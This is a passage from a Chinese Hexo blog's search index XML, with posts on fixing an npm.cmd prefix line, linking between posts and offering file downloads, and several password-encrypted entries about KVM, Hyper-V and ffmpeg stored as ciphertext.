<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413014108237.png" alt="image-20230413014108237"></p>
<p>将npm.cmd文件的第12行，修改成下图样式，命令如下，可以直接粘贴，修改完保存。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">prefix --location=global</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413014223400.png" alt="image-20230413014223400"></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413014302436.png" alt="image-20230413014302436"></p>
<p>那么，我们再次打开cmd，执行一下命令再看看还有没报错</p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413014433543.png" alt="image-20230413014433543"></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客内的小玩法</title>
    <url>/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="Hexo搭建的博客内部文章怎么跳转"><a href="#Hexo搭建的博客内部文章怎么跳转" class="headerlink" title="Hexo搭建的博客内部文章怎么跳转"></a>Hexo搭建的博客内部文章怎么跳转</h2><p><strong>Hexo博客的站内跳转方法:</strong></p>
<p><strong>如果站内有文章名为<code>Hello-World.md</code>的博客，则写法为：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;% post_link Hello-World %&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这里以我的<code>版本切换工具篇.md</code>博客作为跳转</strong></p>
<a href="/2022/11/23/%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2%E5%B7%A5%E5%85%B7%E7%AF%87/" title="版本切换工具篇">版本切换工具篇</a>

<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714004330105.png" alt="image-20230714004330105"></p>
<p><strong>渲染后则出现超链接</strong></p>
<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714004446117.png" alt="image-20230714004446117"></p>
<p><strong>点击则跳转站内文章</strong></p>
<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714004520461.png" alt="image-20230714004520461"></p>
<p><strong>从今天起，博客文章迎来大变局，从前像<code>Manjaro-生存手册</code>那样一篇博客<code>14K</code>字数的长篇大论的文章会大大减小。取而代之的会是各种模块的文章以<code>超链接</code>形式穿插其中</strong></p>
<h2 id="Hexo博客中提供下载文件功能"><a href="#Hexo博客中提供下载文件功能" class="headerlink" title="Hexo博客中提供下载文件功能"></a>Hexo博客中提供下载文件功能</h2><p><strong>在这个数据时代，一个出色的博客不仅仅提供代码的复制和图片的展示，还应该提供文件的下载，这里将以超链接的形式将保存的文件,如:(txt、html)嵌入博客，以提供更好的学习需求。</strong></p>
<p><strong>在对应的博客文件夹里面放入文件，然后渲染博客文章</strong></p>
<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714101346750.png" alt="image-20230714101346750"></p>
<p><strong>记住该博客的日期<code>date</code>是<code>2023-03-17</code></strong></p>
<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714101031912.png" alt="image-20230714101031912"></p>
<p><strong>用<code>hexo g</code>命令渲染博客文章，然后找到博客文件夹下的<code>public</code>找到<code>2023 03 17</code>的<code>python爬虫和数据分析</code>可以看出文件都被渲染出来了，那么只需在对应的<code>python爬虫和数据分析.md</code>博客里面写好链接即可。</strong></p>
<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714101307648.png" alt="image-20230714101307648"></p>
<p><strong>只需要把文件丢对应的博客文件夹里，然后在博客文件里面写</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[需要的下载文件名字](需要的下载文件名字)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714100610511.png" alt="image-20230714100610511"></p>
<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714102806646.png" alt="image-20230714102806646"></p>
<p><strong>点击即可完成跳转</strong></p>
<p><img src="/2023/07/14/hexo%E5%8D%9A%E5%AE%A2%E5%86%85%E7%9A%84%E5%B0%8F%E7%8E%A9%E6%B3%95/image-20230714102935758.png" alt="image-20230714102935758"></p>
<p><strong>写好的<code>html</code>文件也是这样跳转</strong></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>archlinuxのkvm虚拟化(搁浅)</title>
    <url>/2023/07/15/archlinux%E3%81%AEkvm%E8%99%9A%E6%8B%9F%E5%8C%96/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="c1cdca2901fadaf95b0682a66e6c39d6e211aae6cdcaab93a19abd0c99b5f0b1">63612e356b8da2492e34c83596341841fbe9d524ed17a248958e317ec34ed40766a7fb58087138a2638a07dd63315887568c79ba507fc54113547c9b91e3f111b9a194ecf344d7dac9b800e183a68ee2a0ef8ea9acceff4b58367abf7f86996d97001e6228c52fd7d6716b8abe2404b6fb9bbb197d64aae04683c8f18d4e2ee205e1831900c8316a2a7633d2822820d0ec7997189b5b7ac3dee871eb8ea54d69fbbf9c6e5fb97b402c383804f8b69fe09cc6e28acc0f513b483ece814e46a1f370b91ffc113e708f1b42289398ee4b8dfe9cc66ff796d44b0f20e97e2f33eaef023125af1d18587c79ae240912d3298a160ddae1ac474d9bb6f4c296caa1be53fddcd91b5effb831e2253021d345f51a83bdb3cfbf2ecc918622c652bab6b9e621945fbc9b4aeffd29d220915cfd5955cca0b134cfbfa218e3caa6fa5b0a022db310dd14ce13d5b27a91df5d2fd4bea87c9775f71bc0b0ac05e0ae85a1d5a63d538b242a22e223ab1e3c63dd1cf09c503730098611563e84b30d6e294bc901fe6fc29df3da95d7ff6986a0ccad78b5344ab20eeaa099d07be9aafa54172ede7fbfabb6e164076da201be2a63a56fe4678f9b989c1ab2658be71917ee7f899204193717f9b0bf640119bfc7fe406cffd48df9353f7a099a81cc3f42ec36f49ed4a0eb9e9bd70570a642cb3d39eabb2a69e4591ea3e0f0bebfdeb3e1cd91b866c5a9d8c647672bc7eba18b70ec9bd3f05925a8605550b8a611874e1f1fcc7b34ac165e20fe7b11ae22c34a37463d6baec60d24aeb81f2864038f6eb135b81e8f2fb5dc2a1916a3a50d33a038a7948e481f85be5dea30a8a40abdfc373b49983d808cd815835a5fc2d36081ae5b70af97da66e61d71388f20478eafd8607edba0ba56ff90c2649dbd0aa0172e5af8ed9e2847cd5f785ec0eba1d56df9837978e20c9670b796d46d4385a4f77ee63986f22e0a583fc2628ae68a2a15a36ed8caedf0703eb344e767cc48f0530978dd1622b7e49de86e34b00804d9787f2ef076c3ab72a2b81843d2f13fa4113d999a95f574ca96686d47fc567f6c95156e8c476ee0ed38fb5a6616f795f0fe1170cb6b033ac77fa99914452749b9fbb902d278aee7feaa889d98a8963d327c262ed99f99f3eb8d29c5af9c4114dfcffa57517922dcddfe3cdcce9d20a557c344fd9fa91eb346a5bb288de38c7a6fa5f102cf5033ecf59dedf0d64291398f22331cc10119e8745476916d652625f37e0302110d66fd05ada81448cc66657fccf5a85fd89c392371d9f70ff0d22da2973c207d943e493c7d763ef571c6254dddcff0f7d8b204c33abce0b7448637316171d11151916603a77992239bbcdae850dc8963f98fd58c8790b499f41c539b2295575f1e3ac3849be99542b1269a6df2deb87e81ea856fe00e347c6936130224c361b70d23078d70104eac62c6efc01f2141f3534a42434e48f89e3420883825c1c30f970b79df4bb22d0454817c44fda1091fd0a44315f4be4c9bbe39bacf82d8e74442d0805ee723840c12231df528bea19aa0905709f2ae53960ee7e22a539c691d808736f8d20fa41f141f52773aa8b1cdb461c1b353e543e011671af35de341477df6a9feff70e2ca4c6d9f9b400c39c069566e49c822d55839c526bf443919b45cace216f95531af4e6a03b34025e1e9e28a90725e531a01890a55a60af0295cb4bb78a653a2fab30f15eb8e6bd30853dbc5a65fda02e0a8f0d542fbb2a7f3683b2a607163da5140cb300719f080dc8bf72e3cfd1776d25449651928746a7545e2b7913727c419dacf72afbdd631fe8979fc7bbf06a7c77da4daa9b576ecbaf43df2f59fb11e0a59d93445d2efb28e4f9c65f44fe63d4bc623b6783f60856d72119336bb9edc46ad6ca7d9a6089c65b892a9bba94c378926f463860a31f1e16a2eeec1a613d0bd69895a6ea89a2929408291252374f45a0b0fb2378b0383f89c19a84af2196527e9c17d8d80a2f0b5972a1ee03daae15a643fb3ff59ea66a967829f633b176ee4d1a3e2d46869fcfb6304eef900e0437f676a779e6f47304bc03416aec8f8d061480d6aa10d7e3834c84b0f1c7b4e844506d0c15de94be3fe317fc76c0dbadfda1199d2ce33917c3ead4628ec19a5de1a406adaa20bd1356ae30c8fa47a2fb2d2dc7a4849daee65d402da319034b80c06eb60765da0a074011decabf24322e24f1613b764aa9cda73c85c5e1b542c662e66682eeafcd68e2e4feb61b30cf3f0c8d44d55938535b83a3551e4e566a070c86dc49280b9fc023b2259ebf43e987fb615c6b62e4e0cf535983f9d8d1d5400bea785c9859f45682f163dde6ca8d486a10767887e639efbef6851f2eb49d9bad1e5f77eb8316f63e09a834a30448cb23706d6d7becd3ee3381a3e2f97761ddd0a690f7a74b60264434241ed586eb3e212e55620a2480aa7cc38533ceba614cc6c2856a6bcfdb14feeffbb3da2dd7155eb1eb158579b0c403921eab85f006f7aedf2e75955b0252e6c0f4d63eb9603a7d7b8ee03dd23dc0b64e6ef65797e5528306aa5ee51a618f52e3037d207d9a6c6e01b4710a6bf4e4afad63728f92dec2a9c9d59cdd81a33a18b275a9d110c5c894a3a97f8600ecc0af3119c8e8beea5c409107b6b74e2b0e0384f10ec33356339c281c49066e4237379752fd98b7ad05b3f38d750d61372488589012f9c732458669293911871853c1c5eddd9b9fc227ba06751dc89e5e686384ef3bebaa0ea3778b3cdf637b49f72ad280160467de151c92b7a5de665367137507bd7b7295edbe9b9aaa22b75879b83983de22ff36cb2d6d64ac6ad01390196a2247363cf1458234f8c095176c8a169acbd4e1c341002f07639e3e95763eee0695d132e715722fa1d12c979098d595239bb2bc04881db78c97876f7b5baadbcb12790a9f9fce5c7306ead4de6724f5360cfe3e0e17870300617f35161c0e2621073cb31a3cd02ad7edc039faf2aff6cdca9e3401ecaaef49299f6c1a773ddfa368aecd87124057540c438b15c606eceb1b53fc03472291f92c843ce955143b5a5ef119404dc0ebbce74f47bc4ef64ca12d91a3ba140e665a477ed6d524fb50ef77c1e82054011cf2ed730cf279a5dd11c5770d6425bdf3f88a4f43ebb66f717f97c89ebc191df4c1e2f447fed9e2e63497c5bfe6d7b1d4b941fe8731d0681ab8f89b33d0e9580573cdf3be6c787bb0c24db0e38b5b3aa7c36a30bf60909bf85a6d7add11188e11549c19473ea3ed55e851fa87f8492c5619317cae148b95c95a450dcd65c314873708109872b04a2f4fb469558a82b4043ec510462cd9cd573cd7e2e25dcc7a3794facd8616621f493177386679509d1f4ce49ab4213802578cb61053f03df4482e5787f34600a1a322ab0fdf7a4c4f39f5a86e6b8ae9260ebd38b2d77b23621b82473bbaf57fa8f10506bf438696cef15db46f5293d827a7d671020467eff14b97826b531efebba28eeccbc9d0f0fe0048cbb930b53c705461de0799d1a1a46551069f71f8338b4b636d57de414acb59c9d387646ddd46ef8741ae462653fab5393ef48cd358715511c6af5538cb91e410382a4ccad26d8a3f4bbae55227b0e57cb9d3799d9f9df342c1098a86c48f96b498aff98ebe6dbaed8503ba4a5e2dbf348043ea7b3fd038431a9618abe1ef46834c0fc436ebd8923c79be4b07c611427c149b1ab83fdd0a0b11b8f1339e2980648f91fc1f570cd45d203e4a2cdf14c9c7269f76ca2bcc5a0ea42a1b21afccd6820b8fe4607821bb7482bb61507779f48a7226854aab966d9287ec19b01b03cc427a37bae14b7b7db4c972a63213453a2a1620d54b5f32e68ac065a9938598e511eb454e43d5b32720273c778bfdb7e4d8b8dd2fcb23fcc4a560b8df6d5b7e724c911586c91d47b07059b986cd61843eec10c47fa8d4aa12b7481967dfa749958bcade5c3b42708f6b38dd37ed7ab27977a2509aa5a174b91e0c229cb9d8bccfb3ec3b5bbe129303bc15f9f8af4014fcb1bcbf03d844224cfe02d5e9fab4343b9ffade4ce45cfec96e04b541ccd32bc0c2889e997ae9dd1d7b748c348968e0d381a5bdf866b572ba2e7778e1840a4f936d8f6e4252e3baf9b56dc38010546df7ba85b94ace011df1e3ae6892b0c7525e822aa6d1c5c919f599175a6815c1fc2b137d2cf0893d3077bb5ae6852f77aed479a9c9fb3d97fea09b632c7246bd103846a2b4c6c0a0fcf16ed4a6e4afcb8ef5f88511dc73c886f4b3164b62569bfc31eaee5ce59ec6e39941336b8e1ac60b683fd35c96f656a3c94799f6649294c62e847d9031c0864954c395900b6fd093447c989d33523ed4aa472c8509c4a00820cd92d31f29348dd65a6f04e6a94af01993f9e9c3289829023434fea2a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>KVM</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Archlinux</tag>
        <tag>虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title>Hyper-V虚拟化之VGPU显卡直通(搁浅)</title>
    <url>/2023/07/18/Hyper-V%E8%99%9A%E6%8B%9F%E5%8C%96%E4%B9%8BVGPU%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="13e22af4d0a3e0d77c1468f1bd1d105184341f56648227df52094c0e34a5d08f">63612e356b8da2492e34c835963418410512da5924977d303e4f05ad1de34089</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Hyper-V</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title>萌新ffmpeg笔记(搁浅)</title>
    <url>/2023/07/18/%E8%90%8C%E6%96%B0ffmpeg%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="9fd57f2e00d6a91bf1a791e4a442258a95b2ff187d1502aa2bd1169fe61fb3f2"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>ffmpeg</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ffmpeg</tag>
      </tags>
  </entry>
  <entry>
    <title>devopsの学习</title>
    <url>/2023/07/20/devops%E3%81%AE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
